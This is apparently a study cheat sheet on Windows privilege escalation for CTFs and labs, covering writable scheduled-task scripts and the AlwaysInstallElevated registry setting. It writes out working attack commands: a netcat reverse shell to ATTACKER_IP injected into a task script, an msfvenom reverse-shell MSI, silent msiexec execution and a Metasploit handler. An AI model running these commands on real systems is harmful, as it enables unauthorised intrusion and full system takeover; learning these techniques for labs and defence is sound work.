# Scheduled Tasks

## **🔐Privilege Escalation (Windows)**

> These methods are often more relevant in CTFs or labs than real-world pentests.
> 

---

### **🕒 1.Scheduled Tasks Misconfiguration**

- **Description**: If a scheduled task runs a script/binary that is writable by a low-priv user, that user can modify the script to escalate privileges.

### **🔍 Identify Scheduled Tasks**

```
schtasks
schtasks /query /tn <TaskName> /fo list /v
```

**Key fields to look for:**

- Task To Run: Path to the executable/script
- Run As User: Who the task runs as (privileged?)

### **🔐 Check File Permissions**

```
icacls C:\tasks\schtask.bat
```

If you see:

```
BUILTIN\Users:(I)(F)
```

→ Low-priv users have **Full Control**.

### **🔧 Exploit**

Overwrite the script with a reverse shell payload:

```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Start listener:

```
ncat -lvnp 4444  # or nc -lvnp 4444 (Linux)
```

Run the task (if allowed):

```
schtasks /run /tn vulntask
```

### **🔄 Result:**

You get a reverse shell as taskusr1.

---

### **🧩 2.AlwaysInstallElevated (Registry Misconfig)**

> ⚠️
> 
> 
> **Not exploitable in this lab**
> 
- MSI installer files can run with elevated privileges if the system is misconfigured.

### **📝 Check if exploitable:**

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Both must have:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

### **💣 Exploit (if both keys set):**

Generate malicious .msi file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o malicious.msi
```

Transfer and execute:

```
msiexec /quiet /qn /i C:\Path\to\malicious.msi
```

Set up a reverse shell handler in Metasploit:

```
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run
```

---

### **🧠 Summary Notes**

| **Method** | **Key Command / Concept** | **Goal** |
| --- | --- | --- |
| **Scheduled Tasks** | schtasks /query, icacls | Overwrite writable task script |
| **Run Task** | schtasks /run /tn <task> | Get shell as higher-priv user |
| **AlwaysInstallElevated** | reg query, msiexec /i malicious.msi | Run .msi as SYSTEM/admin |